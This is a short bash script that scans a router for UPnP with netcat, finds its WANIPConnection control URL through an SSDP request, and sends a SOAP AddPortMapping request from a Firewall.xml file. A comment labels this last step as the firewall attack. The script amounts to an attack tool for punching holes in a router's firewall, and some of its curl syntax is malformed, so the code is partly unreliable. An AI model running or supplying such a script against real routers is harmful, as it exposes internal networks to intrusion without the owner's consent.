#!/bin/bash
# Check if curl is installed
if ! command -v curl &> /dev/null; then
	echo 'Curl is not installed.'
	exit 1
fi
#NETCAT SCAN
ROUTER_IP="${1:-192.168.0.1}"
ROUTER_PORT="${2:-1900}"
NETCAT=$(nc -vv -z "$ROUTER_IP" "$ROUTER_PORT" 2>&1)

#CURL THE ROUTER
if echo "$NETCAT" | grep "1900" && echo "$NETCAT" | grep "succeeded"; then
echo -e "M-SEARCH * HTTP/1.1\r\nHOST: $ROUTER_IP:$ROUTER_PORT\r\nMAN: \"ssdp:discover\"\r\nMX: 3\r\nST: ssdp:all\r\n" | nc -u -w 1 "$ROUTER_IP" "$ROUTER_PORT" &> file.tmp
	CURL=$( cat file.tmp | grep -oP '(?<=Location: ).*(?=\r)' | head -n1 )
else
	CURL="NO UPNP port finded or Error idk."

fi

#WANIPConnection CONTROL URL
if ( echo $CURL | grep "uuid" ); then
	CONTROL_URL=$( curl $CURL | grep -i 'WANIPConnection.*controlURL' )

else
	CONTROL_URL="NO Control URL detected.."

fi

#Check if Firewall file is stil here lol.
if [ ! -f "Firewall.xml" ]; then
    echo "Firewall.xml not found."
    exit 1
fi
# Lauch The Firewall Attack
curl -v \
 --http1.1 \
 X 'POST' \
-H 'Content-Type: text/xml; charset="utf-8"' \
-H 'Connection: close' \
-H 'SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"' \--data @Firewall.xml \
"$CONTROL_URL"

# echo in the terminal
echo '[DATA NETCAT]' > Router.txt
echo $NETCAT >> Router.txt
echo '[DATA CURL]' >> Router.txt
echo $CURL >> Router.txt
echo '[CONTROL URLS]' >> Router.txt
echo $CONTROL_URL >> Router.txt
echo $CONTROL_URL > controlurl.txt
cat Router.txt
